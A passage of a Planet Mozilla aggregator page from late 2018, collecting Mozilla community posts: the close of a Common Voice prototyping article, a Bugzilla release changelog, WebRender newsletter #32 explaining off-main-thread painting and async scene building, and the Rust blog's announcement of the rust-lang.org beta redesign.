Reality</a>¬†team.</p><figure><img alt="" src="1+en52ue4vyy4drc7fcwe2uq.png" />&lt;figcaption&gt;Relaunched in August 2018 as a portal, the contribution experience is now multi-language enabled&lt;/figcaption&gt;</figure><p>For the current online experience we solidified user journeys that enabled immediate impact of the website and began laying foundation that would enable more robust future experiments. Some of these, such as the <a href="https://voice.mozilla.org/en/speak">new contribution experience</a> and <a href="https://voice.mozilla.org/en/new">homepage</a>, we‚Äôve already seen land in production as iterations of the Common Voice MVP prototype. Other feature enhancements, like a new profile login experience‚Ää‚Äî‚Ääwhich enables contributors to save their progress across multiple languages and view that progress via a <a href="https://projects.invisionapp.com/share/3UG9HFKGSFC#/screens/298657338">new dashboard</a>‚Ää‚Äî‚Äähave <a href="https://discourse.mozilla.org/t/common-voice-now-has-saveable-profiles/33831">launched</a> this week and are undergoing collaborative QA with our communities. The goal of these features being to improve the human experience while increasing the quality and quantity of voice contributions.</p><figure><img alt="" src="1+w4e5own8v3ge2csmx_03vg.png" />&lt;figcaption&gt;Prototyping continues with the new stat dashboard for Common¬†Voice&lt;/figcaption&gt;</figure><p>With Common Voice we see through incremental, open iteration that our team has been able to intentionally grow from the early prototype. In doing so we are actively working to create more avenues for contribution regardless of language, device or location. Our next post will take a deeper look at how we‚Äôre empowering contributions of all sizes, in Common Voice and elsewhere, for Open Innovation.</p><img src="stat" width="1" height="1" /><hr /><p><a href="https://medium.com/mozilla-open-innovation/prototyping-with-intention-33d15fb147c2">Prototyping with Intention</a> was originally published in <a href="https://medium.com/mozilla-open-innovation">Mozilla Open Innovation</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p></div></div><div class="permalink"><a href="https://medium.com/mozilla-open-innovation/prototyping-with-intention-33d15fb147c2?source=rss----410b8dc3986d---4">by Megan Branson at <time datetime="2018-11-29T15:40:58Z" title="November 29, 2018 03:40 PM GMT">‰∏ãÂçà11:40:58</time></a></div></div><div class="news mozilla-b-team"><a id="news-71"></a><h3><a href="https://mozilla-bteam.tumblr.com/" title="Mozilla B-Team">Mozilla B-Team</a> ‚Äî <a href="https://mozilla-bteam.tumblr.com/post/180620441743">happy bmo push day!</a></h3><div class="entry"><div class="content"><p><a href="http://dylan.hardison.net/2018/11/19/happy-bmo-push-day-18/">happy bmo push¬†day!</a></p><blockquote><p><a href="https://github.com/mozilla-bteam/bmo/tree/release-20181119.1">release tag</a></p>
<p>the following changes have been pushed to bugzilla.mozilla.org:</p>
<ul><li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1505793">1505793</a>] Add triage owner in /rest/bug</li>
<li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1506754">1506754</a>] Group Membership report ‚Äúinclude disabled users‚Äù doesn‚Äôt seem to work</li>
<li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1328665">1328665</a>] Two issues with Project Review form for RRAs</li>
<li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1505050">1505050</a>] make the request nagging script more robust</li>
<li>[<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1504325">1504325</a>] Mozilla Gear Request form broken: The requested format gear does not exist with a‚Ä¶</li>
</ul></blockquote><p><a href="http://dylan.hardison.net/2018/11/19/happy-bmo-push-day-18/">View On WordPress</a></p></div></div><div class="permalink"><a href="https://mozilla-bteam.tumblr.com/post/180620441743">by dylanwh at <time datetime="2018-11-29T15:06:33Z" title="November 29, 2018 03:06 PM GMT">‰∏ãÂçà11:06:33</time></a></div></div><div class="news mozilla-gfx" xml:lang="en"><a id="news-72"></a><h3><a href="https://mozillagfx.wordpress.com/" title="Mozilla Gfx Team Blog">Mozilla GFX</a> ‚Äî <a href="https://mozillagfx.wordpress.com/2018/11/29/webrender-newsletter-32/">WebRender newsletter #32</a></h3><div class="entry"><div class="content"><p>Hey there! Did you hear this? Me neither. The 32nd episode of WebRender‚Äôs newsletter made its way to your screen without a sound. In the previous episode, nic4r <a href="https://mozillagfx.wordpress.com/2018/11/21/webrender-newsletter-31/#comment-2756">asked</a> in the comments section a lot of technical and interesting questions. There is a lot to cover so I‚Äôll start by answering a couple here by way of introduction and will go through the other questions in later posts.</p>
<blockquote><p>
  How do the strategies for OMTP and WebRender relate? Would OMTP have benefits for expensive blob rasterization since that used Skia?
</p></blockquote>
<p>OMTP, for off-main-thread painting, is a project completely separate from WebRender that was implemented by <a href="http://dreamingofbits.com/">Ryan</a>. Without WebRender, painting used to happen on the main thread (the thread that runs the JS event loop). Since this thread is often the busiest, moving things out of it, for example painting, is a nice win for multi core processors since the main thread gets to go back to working on JS more quickly while painting is carried out in parallel. This work is pretty much done now and Ryan is working on <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=fission">project Fission</a>.</p>
<p>What about WebRender? WebRender moved all of painting off of the main thread by default. The main thread translates Gecko‚Äôs displaylist into a WebRender displaylist which is sent to the GPU process and the latter renders everything. So WebRender and OMTP, while independent projects both fulfill the goal of OMTP which was to remove work from the main thread. OMTP can be seen as a very nice performance win while waiting for WebRender.</p>
<p>Expensive blob rasterization is already carried out asynchronously by the scene builder thread (helped by a thread pool) which means we get with blob rasterization the same property that OMTP provides. This is a good segue to another question:</p>
<blockquote><p>
  How do APZ and async scene building tie together?
</p></blockquote>
<p>APZ (for Asynchronous Panning and Zooming) refers to how we organize the rendering architecture in such a way that panning and zooming can happen at a frame rate that is decoupled from the expensive parts of the rendering pipeline. This is important because the perceived performance of the browser largely relies on quickly and smoothly reacting to some basic interactions such as scrolling.</p>
<p>With WebRender there are some operations that can cost more than our frame budget such as scene building and blob image rasterization. In order to keep the nice and smooth feel of APZ we made these asynchronous. In practice this means that when layout changes happen, we re-build the scene and perform the rasterization of blob images on the side while still responding to input events so that we can continue scrolling the previous version of the scene until the new one is ready. I hope this answers the question. Async scene building is one of the ways we ‚Äúpreserve APZ‚Äù so to speak with WebRender.</p>
<h3>Notable WebRender and Gecko changes</h3>
<ul>
<li>Jeff <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1509167">improved</a> performance when rendering text by caching nsFontMetrics references.</li>
<li>Jeff <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1509554">removed</a> some heap allocations when creating clip chains.</li>
<li>Jeff <a href="https://github.com/servo/webrender/issues/3358">wrote</a> a tool to find large memcpys generated by rustc.</li>
<li>Dan continued working on scene building performance.</li>
<li>Kats is helping with the AMI upgrade for Windows.</li>
<li>Kats Fixed crashes due to large draw target allocations.</li>
<li>Kats Got captures to work on Android.</li>
<li>Kvark <a href="https://phabricator.services.mozilla.com/D13081">removed</a> non-zero origin of reference frames stacking contexts and iframes.</li>
<li>Kvark <a href="https://github.com/servo/webrender/pull/3361">made</a> a <a href="https://github.com/servo/webrender/pull/3362">couple</a> of memcpy optimizations.</li>
<li>Kvark <a href="https://github.com/servo/webrender/pull/3339">fixed</a> replaying a release capture with a debug version of wrench.</li>
<li>Kvark <a href="https://github.com/servo/webrender/pull/3344">prevented</a> tiled blob images from making captures unusable.</li>
<li>Matt Improved the performance of displaylist building.</li>
<li>Andrew <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1509408">fixed</a> a rendering issue with animated images.</li>
<li>Andrew <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1509998">fixed</a> a crash.</li>
<li>Glenn landed all of the primitive interning and picture caching patches, will probably enable picture caching soon. <a href="https://github.com/servo/webrender/pull/3332">(1)</a>, <a href="https://github.com/servo/webrender/pull/3367">(2)</a>, <a href="https://github.com/servo/webrender/pull/3342">(3)</a>, <a href="https://github.com/servo/webrender/pull/3346">(4)</a>, <a href="https://github.com/servo/webrender/pull/3349">(5)</a>, <a href="https://github.com/servo/webrender/pull/3350">(6)</a>, <a href="https://github.com/servo/webrender/pull/3353">(8)</a>, <a href="https://github.com/servo/webrender/pull/3359">(9)</a> and <a href="https://github.com/servo/webrender/pull/3365">(10)</a>. phew!</li>
<li>Glenn <a href="https://github.com/servo/webrender/pull/3335">added</a> a scratch buffer for transient data during frame building.</li>
<li>Glenn <a href="https://github.com/servo/webrender/pull/3336">reduced</a> the size of BrushPrimitive.</li>
<li>Glenn <a href="https://github.com/servo/webrender/pull/3348">added</a> support for float keys in interning.</li>
<li>Glenn <a href="https://github.com/servo/webrender/pull/3333">fixed</a> a bug with the update of uv rects in the texture cache.</li>
<li>Nical and Gankro <a href="https://github.com/servo/webrender/pull/3277/commits/108fc446b033485b4d2937908f2eb8120db3dc30">simplified</a> tracking image dirty rects in WebRender.</li>
<li>Nical <a href="https://github.com/servo/webrender/pull/3277/commits/df1b17f9e31bb92c838e0608e0d090c56c974c11">stored</a> tile dirty rects in local space.</li>
<li>Nical <a href="https://github.com/servo/webrender/pull/3277/commits/3b444f839d0bc96b063e7cfca2cfb305377ca413">refactored</a> the blob image related APIs to be able to express some of the things we need for blob image re-coordination.</li>
<li>Nical <a href="https://github.com/servo/webrender/pull/3354">fixed</a> a crash.</li>
<li>Nical <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1510447">fixed</a> a memory leak.</li>
<li>Sotaro <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1482350">fixed</a> a WebGL crash when Wayland is enabled.</li>
<li>Sotaro <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1510174">fixed</a> a rendering issue with SurfaceTexture on Android.</li>
<li>Sotaro <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1490117">fixed</a> an intermittent failure related to frame synchronization.</li>
<li>Doug <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1441308">put</a> document splitting up for review.</li>
</ul>
<h3>Ongoing work</h3>
<ul>
<li>Bobby is working on improving the shader cache.</li>
<li>Nical is working on blob image re-coordination.</li>
<li>A lot of people in the team keep investigating performance with a focus on scene building and slow memcpys generated by rustc when medium/large structures are moved on the stack.</li>
<li>Kats keeps improving the situation on Android.</li>
<li>Lee continues improving font rendering.</li>
<li>Markus is getting profiling with full symbol information to work on android.</li>
</ul>
<h3>Enabling WebRender in Firefox Nightly</h3>
<p>In <em>about:config</em>, set the pref ‚Äúgfx.webrender.all‚Äù to true and restart the browser.</p>
<h3>Reporting bugs</h3>
<p>The best place to report bugs related to WebRender in Firefox is the <a href="https://bugzilla.mozilla.org/enter_bug.cgi?product=Core&amp;component=Graphics%3A%20WebRender">Graphics :: WebRender component in bugzilla</a>.<br />
Note that it is possible to log in with a github account.</p></div></div><div class="permalink"><a href="https://mozillagfx.wordpress.com/2018/11/29/webrender-newsletter-32/">by Nical at <time datetime="2018-11-29T13:18:57Z" title="November 29, 2018 01:18 PM GMT">‰∏ãÂçà9:18:57</time></a></div></div><div class="news the-firefox-frontier" xml:lang="en-US"><a id="news-73"></a><h3><a href="https://blog.mozilla.org/firefox" title="The Firefox Frontier">The Firefox Frontier</a> ‚Äî <a href="https://blog.mozilla.org/firefox/firefox-fights-for-you/">Firefox fights for you</a></h3><div class="entry"><div class="content"><p>It‚Äôs been a year here on the internet, to say the least. We‚Äôve landed in a place where misinformation‚Äîsomething we fought hard to combat‚Äîis the word of the year, where ‚Ä¶ <a class="go" href="https://blog.mozilla.org/firefox/firefox-fights-for-you/">Read more</a></p>
<p>The post <a href="https://blog.mozilla.org/firefox/firefox-fights-for-you/" rel="nofollow">Firefox fights for you</a> appeared first on <a href="https://blog.mozilla.org/firefox" rel="nofollow">The Firefox Frontier</a>.</p></div></div><div class="permalink"><a href="https://blog.mozilla.org/firefox/firefox-fights-for-you/">by The Firefox Frontier at <time datetime="2018-11-29T01:59:02Z" title="November 29, 2018 01:59 AM GMT">‰∏äÂçà9:59:02</time></a></div></div><div class="news the-rust-programming-language-blog" xml:lang="en"><a id="news-74"></a><h3><a href="https://blog.rust-lang.org/" title="Rust Blog">The Rust Programming Language Blog</a> ‚Äî <a href="https://blog.rust-lang.org/2018/11/29/a-new-look-for-rust-lang-org.html">A new look for rust-lang.org</a></h3><div class="entry"><div class="content"><p>Before 1.0, Rust had a reputation for changing the language on a near-daily
basis. By contrast, the website has looked pretty much the same. Here‚Äôs the
first version of rust-lang.org, seven years ago (courtesy of <a href="https://web.archive.org/">the WayBack
Machine</a>):</p>
<p><img alt="rust website in 2011" src="rust-www1.png" /></p>
<p>In 2014, three years later:</p>
<p><img alt="rust website in 2014" src="rust-www2.png" /></p>
<p>If you visit <a href="https://rust-lang.org/">https://rust-lang.org</a> today, you'll see this:</p>
<p><img alt="rust website in 2018" src="rust-www3.png" /></p>
<p>Over time, we‚Äôve grown to love it. It‚Äôs simple. Minimal. Familiar.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/11/29/a-new-look-for-rust-lang-org.html#improving-the-content" id="improving-the-content"></a>Improving the content</h3>
<p>But we can always do better. For example, the website suffers from what we
call ‚Äúthe fireflower problem.‚Äù First formulated by <a href="http://seriouspony.com/">Kathy
Sierra</a>, and made into an image by Samuel Hulick:</p>
<p><img alt="the fireflower" src="fireflower.png" /></p>
<p>We want Mario to use Rust, the fireflower, and turn into the ever-awesome
Fire Mario. But there‚Äôs a corollary here: it‚Äôs better to say ‚Äúwe will make
you into Fire Mario‚Äù than it is ‚Äúwe sell fire flowers.‚Äù</p>
<p>(As an aside, we had a <a href="https://brson.github.io/fireflowers/">community discussion on this
topic</a> back in 2016.)</p>
<p>In other words, this list:</p>
<ul>
<li>zero-cost abstractions</li>
<li>move semantics</li>
<li>guaranteed memory safety</li>
<li>threads without data races</li>
<li>trait-based generics</li>
<li>pattern matching</li>
<li>type inference</li>
<li>minimal runtime</li>
<li>efficient C bindings</li>
</ul>
<p>doesn‚Äôt explain what you can <em>do</em> with Rust, which leads people to say ‚ÄúRust
seems neat, but I don‚Äôt know what I would actually use it for.‚Äù</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/11/29/a-new-look-for-rust-lang-org.html#improving-the-style" id="improving-the-style"></a>Improving the style</h3>
<p>We also like the minimalist style of the current site, but it also may be
<em>too</em> minimal. Furthermore, it has no room to grow; we have more than just
rust-lang.org these days. We wanted a style that we could use to unify all of
the websites that we maintain in the Rust project; crates.io being a big one.
Its ‚Äúpool table‚Äù design feels extremely different than rust-lang.org, which
is confusing.</p>
<p>Doing this requires care, as we don‚Äôt want to make the website huge and
complicated, but at the same time, using more than black and blue might be
nice.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/11/29/a-new-look-for-rust-lang-org.html#the-beta" id="the-beta"></a>The beta</h3>
<p>Today, we‚Äôd like to announce a beta of the new rust-lang.org. If you go to
<a href="https://beta.rust-lang.org/">https://beta.rust-lang.org</a>, you‚Äôll see this:</p>
<p><img alt="beta rust website" src="rust-www4.png" /></p>
<p>Its fresh visual design gives us a lot more flexibility in how we get
information across. It retains the minimalist spirit of the old site, while
adding some bold color and visual variety.</p>
<p>We hope you like it as much as we do!</p>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/11/29/a-new-look-for-rust-lang-org.html#some-highlights" id="some-highlights"></a>Some highlights</h4>
<p>The new site puts the ‚Äúwhy Rust?‚Äù question front-and-center, and includes
dedicated pages for the four application domains we targeted in 2018:</p>
<ul>
<li>Embedded devices</li>
<li>WebAssembly</li>
<li>CLI apps</li>
<li>Network services</li>
</ul>
<p>We have also revised the slogan. Historically, it has been:</p>
<blockquote>
<p>Rust is a systems programming language that runs blazingly fast, prevents
segfaults, and guarantees thread safety.</p>
</blockquote>
<p>Like the bullet list of features, this doesn't convey what you can <em>do</em> with
Rust. So we've updated the slogan:</p>
<blockquote>
<p>Rust: The programming language that empowers everyone to become a systems
programmer.</p>
</blockquote>
<p>We're still not sure we love the term "systems programming," as it seems like
it means something different to everyone, but this iteration is significantly
better than the old one. Even if people have different ideas about what
"systems programming" means, they at least have some idea. "guarantees thread
safety," not so much.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/11/29/a-new-look-for-rust-lang-org.html#future-work" id="future-work"></a>Future work</h3>
<p>There‚Äôs still more work to do:</p>
<ul>
<li>Some information on the old site, has not yet been ported over.</li>
<li>Translations have regressed. We‚Äôre working on adding the proper
infrastructure here, and hope to be able to start accepting translations by
the end of the year.</li>
<li>We need more polish and testing in a general sense.</li>
</ul>
<p>Please <a href="https://github.com/rust-lang/beta.rust-lang.org/issues/new/choose">file an
issue</a> with any
feedback you have! We‚Äôre also looking for people with abilities of all kinds
to help maintain the site, and especially people with design, CSS, and
marketing skills. If you‚Äôd like to get involved, please <a href="mailto:www@rust-lang.org">email
us</a>!</p>
<p>We‚Äôd like to ship this new site on December 6, with the release of Rust 2018.
Thank you for giving it a try before then, so we can work out any bugs we
find!</p></div></div><div class="permalink"><a href="https://blog.rust-lang.org/2018/11/29/a-new-look-for-rust-lang-org.html">by The Rust Core Team at <time datetime="2018-11-29T00:00:00Z" title="November 29, 2018 12:00 AM GMT">‰∏äÂçà8:00:00</time></a></div></div></div><div class="sidebar"><div class="disclaimer"><h2>Planet Mozilla</h2><p>Collected here are the most recent blog posts from all over the Mozilla community.
               The content here is unfiltered and uncensored, and represents the views of individual community members.
               Individual posts are owned by their authors -- see original source for licensing information.</p></div><div class="feeds"><h2>Subscribe to Planet</h2><p>Feeds:</p><ul><li><a href="https://planet.mozilla.org/atom.xml">Atom</a></li><li><a href="https://planet.mozilla.org/rss20.xml">RSS 2.0</a></li><li><a href="https://planet.mozilla.org/rss10.xml">RSS 1.0</a></li></ul><p></p><p>Subscription list:</p><ul><li class="foaf"><a href="https://planet.mozilla.org/foafroll.xml">FOAF</a></li><li class="opml"><a href="https://planet.mozilla.org/opml.xml">OPML</a></li></ul><p>Last update: <time datetime="2018-12-28T06:12:52Z" title="December 28, 2018 06:12 AM GMT">2018/12/28 ‰∏ãÂçà2:12:52</time></p></div><div class="main"><h2>Other Planets</h2><ul class="planets"><li><a href="http://planet.mozilla.org/projects/">Projects</a></li><li><a href="http://planet.mozilla.org/participation/">Planet Participation</a></li><li><a href="http://planet.mozilla.org/thunderbird/">Planet Thunderbird</a></li><li><a href="https://quality.mozilla.org/">Planet QMO</a></li><li><a href="http://planet.mozilla.org/ateam/">Planet Automation</a></li><li><a href="http://planet.mozilla.org/research/">Mozilla Research</a></li></ul><div id="sidebar"><h2>Search</h2><form action="https://planet.mozilla.org/"><input name="q" value="" /></form><h2>Options</h2><form action="https://planet.mozilla.org/"><p><input id="navkeys" type="checkbox" /><a title="Navigate entries">Enable <code>N</code> and <code>P</code> keys</a></p></form></div><h2>Subscriptions</h2><ul class="subscriptions"><li><a title="subscribe" href="http://dblohm7.ca/blog/categories/mozilla/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://dblohm7.ca/" class="message" title="no activity in 90 days">Aaron Klotz</a></li><li><a title="subscribe" href="https://blog.mozilla.org/community/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/community" title="about:community">About:Community</a></li><li><a title="subscribe" href="https://adamlofting.com/tag/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://adamlofting.com/" class="message" title="no activity in 90 days">Adam Lofting</a></li><li><a title="subscribe" href="https://adammuntner.wordpress.com/tag/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://adammuntner.wordpress.com/" class="message" title="no activity in 90 days">Adam Munter</a></li><li><a title="subscribe" href="https://www.blogger.com/feeds/1661421867176855681/posts/default"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://sporadicdispatches.blogspot.com/" class="message" title="no activity in 90 days">Adam Roach</a></li><li><a title="subscribe" href="http://bornawesome.com/adam/rss.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://bornawesome.com/adam/" class="message" title="no activity in 90 days">Adam Stevenson</a></li><li><a title="subscribe" href="https://adblockplus.org/atom/?category=mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://adblockplus.org/" class="message" title="no activity in 90 days">Adblock Plus</a></li><li><a title="subscribe" href="http://adrian.gaudebert.fr/blog/feed/tag/mozilla/atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://adrian.gaudebert.fr/blog/" class="message" title="no activity in 90 days">Adrian Gaudebert</a></li><li><a title="subscribe" href="http://escapewindow.dreamwidth.org/data/rss?tag=mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://escapewindow.dreamwidth.org/" class="message" title="no activity in 90 days">Aki Sasaki</a></li><li><a title="subscribe" href="http://feeds.feedburner.com/InPursuitOfMysteries/Mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://http//makehacklearn.org/" class="message" title="no activity in 90 days">Al Billings</a></li><li><a title="subscribe" href="https://www.a2p.it/wordpress/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.a2p.it/wordpress" class="message" title="no activity in 90 days">Alessio Placitelli</a></li><li><a title="subscribe" href="http://alxgbsn.co.uk/feed/index.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://alxgbsn.co.uk/" class="message" title="no activity in 90 days">Alex Gibson</a></li><li><a title="subscribe" href="https://alexvincent.us/blog/?feed=rss2"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://alexvincent.us/blog" class="message" title="no activity in 90 days">Alex Vincent</a></li><li><a title="subscribe" href="http://asurkov.blogspot.com/feeds/posts/default"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://asurkov.blogspot.com/" class="message" title="no activity in 90 days">Alexander Surkov</a></li><li><a title="subscribe" href="http://techno-barje.fr/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://techno-barje.fr/" class="message" title="no activity in 90 days">Alexandre Poirot</a></li><li><a title="subscribe" href="http://www.servicedenuages.fr/feeds/mozilla.atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.servicedenuages.fr/" class="message" title="no activity in 90 days">Alexis Metaireau</a></li><li><a title="subscribe" href="http://www.wirfs-brock.com/allen/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.wirfs-brock.com/allen" class="message" title="no activity in 90 days">Allen Wirfs-Brock</a></li><li><a title="subscribe" href="http://www.blogger.com/feeds/2681864008001569004/posts/default"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://mozakai.blogspot.com/" class="message" title="no activity in 90 days">Alon Zakai</a></li><li><a title="subscribe" href="https://mozamy.wordpress.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mozamy.wordpress.com/" class="message" title="no activity in 90 days">Amy Tsay</a></li><li><a title="subscribe" href="http://143th.net/rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://143th.net/" class="message" title="no activity in 90 days">Andrea Marchesini</a></li><li><a title="subscribe" href="https://farre.github.io/blog/rss/mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://farre.github.io/blog" class="message" title="no activity in 90 days">Andreas Farre</a></li><li><a title="subscribe" href="http://sny.no/weblog/mozilla.atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://sny.no/" class="message" title="no activity in 90 days">Andreas Tolfsen</a></li><li><a title="subscribe" href="https://ahal.ca/tags/mozilla/index.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://ahal.ca/tags/mozilla/" title="Mozilla on Hunting the Shmoo" class="active">Andrew Halberstadt</a><ul><li><a href="https://ahal.ca/casts/2018/taskgraph-like-a-pro/">Taskgraph Like a Pro</a></li></ul></li><li><a title="subscribe" href="http://overholt.ca/wp/?feed=rss2&amp;cat=9"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://overholt.ca/wp" class="message" title="no activity in 90 days">Andrew Overholt</a></li><li><a title="subscribe" href="http://www.visophyte.org/blog/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.visophyte.org/blog" class="message" title="no activity in 90 days">Andrew Sutherland</a></li><li><a title="subscribe" href="http://www.blogger.com/feeds/6582558326986936439/posts/default"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://feer56.blogspot.com/" class="message" title="no activity in 90 days">Andrew Truong</a></li><li><a title="subscribe" href="https://www.ahunt.org/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.ahunt.org/" class="message" title="no activity in 90 days">Andrzej Hunt</a></li><li><a title="subscribe" href="http://www.agmweb.ca/blog/rss/latest/andy/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.agmweb.ca/blog/andy" title="Andy McKay" class="active">Andy McKay</a><ul><li><a href="http://www.agmweb.ca/2018-12-15-car-tracking/">Car Tracking</a></li></ul></li><li><a title="subscribe" href="http://vakila.github.io/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://vakila.github.io/" class="message" title="no activity in 90 days">Anjana Vakil</a></li><li><a title="subscribe" href="https://annevankesteren.nl/feeds/weblog"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://annevankesteren.nl/" class="message" title="no activity in 90 days">Anne van Kesteren</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="internal server error">Anthony Hughes</a></li><li><a title="subscribe" href="http://blog.technicaldebtcollector.com/feeds/posts/default"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.technicaldebtcollector.com/" class="message" title="no activity in 90 days">Anthony Jones</a></li><li><a title="subscribe" href="https://ricaud.me/blog/feed/tag/mozilla/atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://ricaud.me/blog/" class="message" title="no activity in 90 days">Anthony Ricaud</a></li><li><a title="subscribe" href="http://feeds.feedburner.com/armenzg_mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://medium.com/@armenzg?source=rss-d4d8839a88ef------2" class="message" title="no activity in 90 days">Armen Zambrano</a></li><li><a title="subscribe" href="http://asadotzler.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://asadotzler.com/" class="message" title="no activity in 90 days">Asa Dotzler</a></li><li><a title="subscribe" href="https://blog.mozilla.org/axel/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/axel" class="message" title="no activity in 90 days">Axel Hecht</a></li><li><a title="subscribe" href="http://www.basschouten.com/blog1.php?tempskin=_rss2"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.basschouten.com/blog1.php" class="message" title="no activity in 90 days">Bas Schouten</a></li><li><a title="subscribe" href="https://blog.bengalbraith.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.bengalbraith.com/" class="message" title="no activity in 90 days">Ben Galbraith</a></li><li><a title="subscribe" href="http://hearsum.ca/blog/tags/planet-mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://hearsum.ca/" class="message" title="no activity in 90 days">Ben Hearsum</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Ben Kelly</a></li><li><a title="subscribe" href="https://blog.benj.me/tag/mozilla.rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.benj.me/" class="message" title="no activity in 90 days">Benjamin Bouvier</a></li><li><a title="subscribe" href="http://feeds.feedburner.com/BenjaminKerensaDotComMozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://benjaminkerensa.com/" class="message" title="no activity in 90 days">Benjamin Kerensa</a></li><li><a title="subscribe" href="https://billmccloskey.wordpress.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://billmccloskey.wordpress.com/" class="message" title="no activity in 90 days">Bill McCloskey</a></li><li><a title="subscribe" href="https://softwarewalker.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://softwarewalker.com/" class="message" title="no activity in 90 days">Bill Walker</a></li><li><a title="subscribe" href="https://blog.mozilla.org/mrbkap/feed/atom/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/mrbkap" class="message" title="no activity in 90 days">Blake Kaplan</a></li><li><a title="subscribe" href="https://weblog.latte.ca/tags/mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://weblog.latte.ca/" class="message" title="no activity in 90 days">Blake Winton</a></li><li><a title="subscribe" href="http://bholley.net/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://bholley.net/" class="message" title="no activity in 90 days">Bobby Holley</a></li><li><a title="subscribe" href="http://weblogs.mozillazine.org/bz/index.rdf"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://weblogs.mozillazine.org/bz/" class="message" title="no activity in 90 days">Boris Zbarsky</a></li><li><a title="subscribe" href="https://botondballo.wordpress.com/tag/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://botondballo.wordpress.com/" title="mozilla ‚Äì There's Waldo!" class="active">Botond Ballo</a><ul><li><a href="https://botondballo.wordpress.com/2018/11/30/trip-report-c-standards-meeting-in-san-diego-november-2018/">Trip Report: C++ Standards Meeting in San Diego, November 2018</a></li></ul></li><li><a title="subscribe" href="https://birtles.wordpress.com/tag/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://birtles.wordpress.com/" class="message" title="no activity in 90 days">Brian Birtles</a></li><li><a title="subscribe" href="https://www.brycevandyk.com/tag/mozilla/rss/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.brycevandyk.com/" class="message" title="no activity in 90 days">Bryce Van Dyk</a></li><li><a title="subscribe" href="https://blog.glob.com.au/feed/"><img 